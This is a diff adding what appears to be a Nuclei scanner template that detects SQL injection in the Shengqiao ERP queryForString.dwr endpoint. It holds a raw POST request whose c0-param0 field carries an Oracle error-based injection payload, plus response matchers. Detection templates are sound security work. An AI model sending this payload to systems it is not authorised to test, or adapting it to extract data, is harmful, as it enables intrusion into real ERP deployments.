@@ -1,0 +1,36 @@
+id: shengqiao-erp-queryforstring-dwr-sqli
+info:
+  name: Shengqiao ERP queryForString.dwr SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Shengqiao ERP system's queryForString.dwr endpoint.
+http:
+  - raw:
+      - |
+        POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        c0-id=0
+        batchId=0
+        callCount=1
+        c0-param1=Object_Object:{}
+        page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
+        httpSessionId=47CA299619667847F1BB450454E6C2D4
+        scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
+        c0-scriptName=NamedParameterSingleRowQueryConvertor
+        c0-methodName=queryForString
+        c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "qjzzq1qvzvq"
+          - "SYS.XMLTYPE"
+          - "java.sql.SQLException"
